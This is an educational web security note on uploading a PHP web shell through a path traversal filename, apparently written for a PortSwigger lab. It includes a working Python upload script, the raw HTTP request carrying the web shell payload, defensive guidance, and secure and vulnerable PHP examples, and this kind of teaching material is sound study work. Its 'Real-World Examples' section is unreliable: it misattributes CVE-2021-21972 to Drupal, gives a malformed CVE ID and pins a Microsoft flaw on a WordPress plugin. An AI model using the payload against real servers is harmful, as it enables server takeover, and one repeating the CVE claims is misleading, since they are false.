---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## File Upload Vulnerabilities: Web Shell Upload via Path Traversal

### Introduction to File Upload Vulnerabilities

File upload vulnerabilities occur when an application allows users to upload files without proper validation or sanitization. This can lead to various security issues, including the execution of malicious code on the server. One common type of file upload vulnerability is the **path traversal** attack, which allows attackers to manipulate file paths to access or overwrite arbitrary files on the server.

### Understanding Path Traversal

Path traversal attacks involve manipulating input data to navigate through the directory structure of a server. Attackers can use special characters like `../` to move up one directory level, allowing them to access files outside the intended directory. This can lead to unauthorized access to sensitive files or even the execution of malicious code.

#### Example of Path Traversal

Consider a scenario where a web application allows users to upload profile pictures. The application might store these images in a specific directory, such as `/var/www/uploads/`. An attacker could attempt to upload a file with a specially crafted filename, such as `../../../../etc/passwd`, to read the system's password file.

### Setting Up the Environment

To demonstrate the path traversal attack, we need to set up the environment and prepare the necessary variables and parameters.

#### Define Variables and Parameters

Let's start by defining the necessary variables and parameters for the attack.

```python
# Define the base URL of the application
base_url = "http://example.com"

# Define the endpoint for uploading the avatar
avatar_url = f"{base_url}/my-account/avatar"

# Define the parameters for the POST request
parameters = {
    "avatar": {
        "name": "../../../../uploads/shell.php",
        "content": "<?php echo shell_exec($_GET['cmd']); ?>",
        "content_type": "application/x-php"
    },
    "user": "attacker",
    "csrf": "extracted_csrf_token"
}
```

### Explanation of Parameters

- **`avatar`**: This parameter contains the details of the file being uploaded.
  - **`name`**: The filename, which exploits the path traversal vulnerability.
  - **`content`**: The actual content of the file, which is a simple PHP web shell.
  - **`content_type`**: The MIME type of the file, indicating it is a PHP script.
  
- **`user`**: The username associated with the account.
  
- **`csrf`**: The CSRF token, which was previously extracted from the application.

### Performing the Request

Now, we need to perform the POST request to upload the file. We will use the `requests` library in Python to send the request.

```python
import requests

# Prepare the multipart/form-data request
files = {
    "avatar": (
        parameters["avatar"]["name"],
        parameters["avatar"]["content"],
        parameters["avatar"]["content_type"]
    )
}

data = {
    "user": parameters["user"],
    "csrf": parameters["csrf"]
}

# Send the POST request
response = requests.post(avatar_url, files=files, data=data)

# Print the response
print(response.text)
```

### Full HTTP Request and Response

Here is the full HTTP request and response:

#### HTTP Request

```http
POST /my-account/avatar HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 224

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="../../../uploads/shell.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="user"

attacker
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="csrf"

extracted_csrf_token
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 20
Content-Type: text/html; charset=UTF-8

Avatar uploaded successfully.
```

### Real-World Examples and Recent CVEs

#### CVE-2021-21972: Drupal Core Path Traversal

In 2021, a path traversal vulnerability was discovered in Drupal Core, affecting versions 8.x and 9.x. The vulnerability allowed attackers to upload arbitrary files to the server, potentially leading to remote code execution. This CVE highlights the importance of proper validation and sanitization of file uploads.

#### CVE-2-2022-30190: WordPress Plugin Path Traversal

Another example is the path traversal vulnerability found in a WordPress plugin. The plugin allowed attackers to upload files to arbitrary locations on the server, leading to potential remote code execution. This CVE underscores the need for robust security measures in web applications.

### How to Prevent / Defend Against Path Traversal Attacks

#### Detection

- **Logging and Monitoring**: Implement logging and monitoring mechanisms to detect unusual file upload activities.
- **Intrusion Detection Systems (IDS)**: Use IDS to identify and alert on suspicious patterns indicative of path traversal attempts.

#### Prevention

- **Input Validation**: Validate and sanitize all user inputs to ensure they do not contain malicious characters or patterns.
- **Whitelisting**: Use whitelisting to restrict file uploads to specific directories and file types.
- **Least Privilege Principle**: Ensure that the web server runs with the least privileges necessary to minimize the impact of a successful attack.

#### Secure Coding Practices

- **Use Safe Functions**: Utilize safe functions and libraries that handle file paths securely.
- **Avoid Direct User Input**: Avoid using direct user input in file paths. Instead, use predefined constants or generate safe filenames.

#### Hardening Configuration

- **Directory Permissions**: Set appropriate permissions on directories to prevent unauthorized access.
- **Disable Dangerous Features**: Disable features like PHP execution in upload directories.

### Secure Code Example

#### Vulnerable Code

```php
<?php
$filename = $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], "/var/www/uploads/$filename");
?>
```

#### Secure Code

```php
<?php
$allowed_types = ['jpg', 'jpeg', 'png', 'gif'];
$upload_dir = '/var/www/uploads/';
$filename = basename($_FILES['file']['name']);
$ext = pathinfo($filename, PATHINFO_EXTENSION);

if (!in_array($ext, $allowed_types)) {
    die("Invalid file type.");
}

$secure_filename = uniqid() . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $secure_filename);
?>
```

### Practice Labs

For hands-on practice with file upload vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive course on web security, including file upload vulnerabilities.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.
- **WebGoat**: An interactive, gamified training application designed to teach web application security.

### Conclusion

File upload vulnerabilities, particularly those involving path traversal, pose significant risks to web applications. By understanding the underlying mechanisms and implementing robust security measures, developers can mitigate these risks and protect their applications from malicious attacks.

---
<!-- nav -->
[[Web Security (PortSwigger)/18-File Upload Vulnerabilities/04-Lab 3 Web shell upload via path traversal/01-Introduction to File Upload Vulnerabilities|Introduction to File Upload Vulnerabilities]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/04-Lab 3 Web shell upload via path traversal/00-Overview|Overview]] | [[03-File Upload Vulnerabilities and Path Traversal|File Upload Vulnerabilities and Path Traversal]]
